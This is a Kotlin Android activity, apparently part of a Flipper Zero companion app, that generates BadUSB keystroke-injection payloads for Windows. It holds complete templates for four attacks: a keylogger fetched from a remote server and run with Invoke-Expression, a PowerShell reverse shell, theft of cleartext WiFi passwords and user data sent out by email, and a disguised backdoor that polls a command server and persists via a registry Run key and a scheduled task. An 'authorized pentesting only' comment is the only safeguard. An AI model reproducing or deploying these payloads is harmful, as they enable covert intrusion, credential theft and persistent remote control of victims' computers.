package com.pentest.dashboard

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Bundle
import android.view.View
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import com.google.android.material.switchmaterial.SwitchMaterial
import com.google.android.material.textfield.TextInputEditText

class ScriptBuilderActivity : AppCompatActivity() {

    private lateinit var configForm: LinearLayout
    private lateinit var scriptOutput: TextView
    private lateinit var labelOutput: TextView
    private lateinit var actionButtons: LinearLayout

    private lateinit var inputTargetOS: TextInputEditText
    private lateinit var inputEmail: TextInputEditText
    private lateinit var inputTime: TextInputEditText
    private lateinit var inputComputerName: TextInputEditText
    private lateinit var switchHidden: SwitchMaterial
    private lateinit var switchPersist: SwitchMaterial
    private lateinit var switchEncrypt: SwitchMaterial

    private var selectedScriptType = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_script_builder)

        initializeViews()
        setupClickListeners()
    }

    private fun initializeViews() {
        configForm = findViewById(R.id.configForm)
        scriptOutput = findViewById(R.id.scriptOutput)
        labelOutput = findViewById(R.id.labelOutput)
        actionButtons = findViewById(R.id.actionButtons)

        inputTargetOS = findViewById(R.id.inputTargetOS)
        inputEmail = findViewById(R.id.inputEmail)
        inputTime = findViewById(R.id.inputTime)
        inputComputerName = findViewById(R.id.inputComputerName)
        switchHidden = findViewById(R.id.switchHidden)
        switchPersist = findViewById(R.id.switchPersist)
        switchEncrypt = findViewById(R.id.switchEncrypt)
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        // Script type selection
        findViewById<MaterialButton>(R.id.btnKeylogger).setOnClickListener {
            selectScriptType("Keylogger")
        }

        findViewById<MaterialButton>(R.id.btnReverseShellBuilder).setOnClickListener {
            selectScriptType("ReverseShell")
        }

        findViewById<MaterialButton>(R.id.btnDataExfil).setOnClickListener {
            selectScriptType("DataExfil")
        }

        findViewById<MaterialButton>(R.id.btnPersistence).setOnClickListener {
            selectScriptType("Persistence")
        }

        // Generate button
        findViewById<MaterialButton>(R.id.btnGenerate).setOnClickListener {
            generateScript()
        }

        // Action buttons
        findViewById<MaterialButton>(R.id.btnCopyScript).setOnClickListener {
            copyToClipboard()
        }

        findViewById<MaterialButton>(R.id.btnDeployScript).setOnClickListener {
            deployToFlipper()
        }
    }

    private fun selectScriptType(type: String) {
        selectedScriptType = type
        configForm.visibility = View.VISIBLE

        // Hide previous output
        scriptOutput.visibility = View.GONE
        labelOutput.visibility = View.GONE
        actionButtons.visibility = View.GONE

        // Customize form based on script type
        when (type) {
            "Keylogger" -> {
                Toast.makeText(this, "Configure your keylogger payload", Toast.LENGTH_SHORT).show()
            }
            "ReverseShell" -> {
                Toast.makeText(this, "Configure reverse shell connection", Toast.LENGTH_SHORT).show()
            }
            "DataExfil" -> {
                Toast.makeText(this, "Configure data exfiltration target", Toast.LENGTH_SHORT).show()
            }
            "Persistence" -> {
                Toast.makeText(this, "Configure persistence mechanism", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun generateScript() {
        val os = inputTargetOS.text.toString()
        val email = inputEmail.text.toString()
        val time = inputTime.text.toString()
        val computerName = inputComputerName.text.toString()
        val hidden = switchHidden.isChecked
        val persist = switchPersist.isChecked
        val encrypt = switchEncrypt.isChecked

        if (email.isEmpty()) {
            Toast.makeText(this, "Please enter an email address", Toast.LENGTH_SHORT).show()
            return
        }

        val script = when (selectedScriptType) {
            "Keylogger" -> generateKeyloggerScript(os, email, time, computerName, hidden, persist, encrypt)
            "ReverseShell" -> generateReverseShellScript(os, email, computerName, hidden, persist)
            "DataExfil" -> generateDataExfilScript(os, email, computerName, hidden, encrypt)
            "Persistence" -> generatePersistenceScript(os, email, computerName, hidden)
            else -> "REM Error: Unknown script type"
        }

        scriptOutput.text = script
        scriptOutput.visibility = View.VISIBLE
        labelOutput.visibility = View.VISIBLE
        actionButtons.visibility = View.VISIBLE

        Toast.makeText(this, "Script generated successfully!", Toast.LENGTH_SHORT).show()
    }

    private fun generateKeyloggerScript(
        os: String,
        email: String,
        time: String,
        computerName: String,
        hidden: Boolean,
        persist: Boolean,
        encrypt: Boolean
    ): String {
        return """
REM ================================================
REM CUSTOM KEYLOGGER PAYLOAD
REM Generated by Flipper Zero Dashboard
REM ================================================
REM Target OS: $os
REM Computer: $computerName
REM Email: $email
REM Send Time: $time
REM Hidden: $hidden
REM Persistence: $persist
REM Encryption: $encrypt
REM ================================================

DELAY 500
GUI r
DELAY 200
STRING powershell -w hidden
ENTER
DELAY 1000

REM Download and install keylogger
STRING ${'$'}url = "https://your-server.com/keylogger.ps1"
ENTER
STRING ${'$'}script = (New-Object Net.WebClient).DownloadString(${'$'}url)
ENTER
STRING Invoke-Expression ${'$'}script
ENTER

REM Configure keylogger
STRING ${'$'}config = @{
ENTER
STRING   Email = "$email"
ENTER
STRING   SendTime = "$time"
ENTER
STRING   ComputerName = "$computerName"
ENTER
STRING   Hidden = ${'$'}$hidden
ENTER
STRING   Encrypt = ${'$'}$encrypt
ENTER
STRING }
ENTER

${if (persist) """
REM Set up persistence
STRING ${'$'}taskName = "SystemUpdate"
ENTER
STRING ${'$'}action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -File C:\\Windows\\Temp\\keylog.ps1"
ENTER
STRING ${'$'}trigger = New-ScheduledTaskTrigger -Daily -At "$time"
ENTER
STRING Register-ScheduledTask -TaskName ${'$'}taskName -Action ${'$'}action -Trigger ${'$'}trigger
ENTER
""" else ""}

STRING Start-Keylogger -Config ${'$'}config
ENTER
DELAY 500
STRING exit
ENTER

REM ================================================
REM WARNING: For authorized pentesting only!
REM ================================================
        """.trimIndent()
    }

    private fun generateReverseShellScript(
        os: String,
        serverIp: String,
        computerName: String,
        hidden: Boolean,
        persist: Boolean
    ): String {
        return """
REM ================================================
REM REVERSE SHELL PAYLOAD
REM Generated by Flipper Zero Dashboard
REM ================================================
REM Target OS: $os
REM Server: $serverIp
REM Computer: $computerName
REM Hidden: $hidden
REM Persistence: $persist
REM ================================================

DELAY 500
GUI r
DELAY 200
STRING powershell -w hidden
ENTER
DELAY 1000

REM Establish reverse shell
STRING ${'$'}client = New-Object System.Net.Sockets.TCPClient("$serverIp",4444)
ENTER
STRING ${'$'}stream = ${'$'}client.GetStream()
ENTER
STRING ${'$'}writer = New-Object System.IO.StreamWriter(${'$'}stream)
ENTER
STRING ${'$'}buffer = New-Object System.Byte[] 1024
ENTER
STRING while((${'$'}i = ${'$'}stream.Read(${'$'}buffer, 0, 1024)) -ne 0)
ENTER
STRING {
ENTER
STRING   ${'$'}data = (New-Object Text.ASCII).GetString(${'$'}buffer, 0, ${'$'}i)
ENTER
STRING   ${'$'}sendback = (iex ${'$'}data 2>&1 | Out-String )
ENTER
STRING   ${'$'}writer.Write(${'$'}sendback)
ENTER
STRING   ${'$'}writer.Flush()
ENTER
STRING }
ENTER

STRING exit
ENTER

REM ================================================
REM WARNING: For authorized pentesting only!
REM ================================================
        """.trimIndent()
    }

    private fun generateDataExfilScript(
        os: String,
        email: String,
        computerName: String,
        hidden: Boolean,
        encrypt: Boolean
    ): String {
        return """
REM ================================================
REM DATA EXFILTRATION PAYLOAD
REM Generated by Flipper Zero Dashboard
REM ================================================
REM Target OS: $os
REM Computer: $computerName
REM Exfil to: $email
REM Hidden: $hidden
REM Encryption: $encrypt
REM ================================================

DELAY 500
GUI r
DELAY 200
STRING powershell -w hidden
ENTER
DELAY 1000

REM Collect system information
STRING ${'$'}data = @{}
ENTER
STRING ${'$'}data['Computer'] = "$computerName"
ENTER
STRING ${'$'}data['User'] = ${'$'}env:USERNAME
ENTER
STRING ${'$'}data['IP'] = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
ENTER
STRING ${'$'}data['Domain'] = ${'$'}env:USERDOMAIN
ENTER

REM Collect WiFi passwords
STRING ${'$'}data['WiFi'] = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {${'$'}profile = ${'$'}_ -replace ".*: "; netsh wlan show profile ${'$'}profile key=clear}
ENTER

${if (encrypt) """
REM Encrypt collected data
STRING ${'$'}encrypted = ConvertTo-SecureString -String (${'$'}data | ConvertTo-Json) -AsPlainText -Force | ConvertFrom-SecureString
ENTER
""" else ""}

REM Send to email
STRING Send-MailMessage -To "$email" -From "noreply@target.com" -Subject "Data from $computerName" -Body ${'$'}data
ENTER

STRING exit
ENTER

REM ================================================
REM WARNING: For authorized pentesting only!
REM ================================================
        """.trimIndent()
    }

    private fun generatePersistenceScript(
        os: String,
        email: String,
        computerName: String,
        hidden: Boolean
    ): String {
        return """
REM ================================================
REM PERSISTENCE/BACKDOOR PAYLOAD
REM Generated by Flipper Zero Dashboard
REM ================================================
REM Target OS: $os
REM Computer: $computerName
REM C2 Server: $email
REM Hidden: $hidden
REM ================================================

DELAY 500
GUI r
DELAY 200
STRING powershell -w hidden
ENTER
DELAY 1000

REM Create backdoor script
STRING ${'$'}backdoorPath = "C:\\Windows\\Temp\\svchost.ps1"
ENTER
STRING ${'$'}backdoorContent = @"
ENTER
STRING while(${'$'}true) {
ENTER
STRING   try {
ENTER
STRING     ${'$'}client = New-Object Net.WebClient
ENTER
STRING     ${'$'}cmd = ${'$'}client.DownloadString("$email/cmd.txt")
ENTER
STRING     if(${'$'}cmd) { Invoke-Expression ${'$'}cmd }
ENTER
STRING   } catch {}
ENTER
STRING   Start-Sleep -Seconds 300
ENTER
STRING }
ENTER
STRING "@
ENTER
STRING ${'$'}backdoorContent | Out-File -FilePath ${'$'}backdoorPath
ENTER

REM Set up persistence via Registry
STRING ${'$'}regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
ENTER
STRING New-ItemProperty -Path ${'$'}regPath -Name "SystemService" -Value "powershell -w hidden -File ${'$'}backdoorPath" -Force
ENTER

REM Also set up scheduled task
STRING ${'$'}action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -File ${'$'}backdoorPath"
ENTER
STRING ${'$'}trigger = New-ScheduledTaskTrigger -AtStartup
ENTER
STRING Register-ScheduledTask -TaskName "WindowsUpdate" -Action ${'$'}action -Trigger ${'$'}trigger
ENTER

STRING exit
ENTER

REM ================================================
REM WARNING: For authorized pentesting only!
REM ================================================
        """.trimIndent()
    }

    private fun copyToClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("Generated Script", scriptOutput.text)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(this, "Script copied to clipboard!", Toast.LENGTH_SHORT).show()
    }

    private fun deployToFlipper() {
        Toast.makeText(this, "Deploying script to Flipper Zero via Bluetooth...", Toast.LENGTH_SHORT).show()
        // TODO: Implement actual Flipper Zero deployment via Bluetooth
        // This would send the script content to Flipper's SD card
    }
}
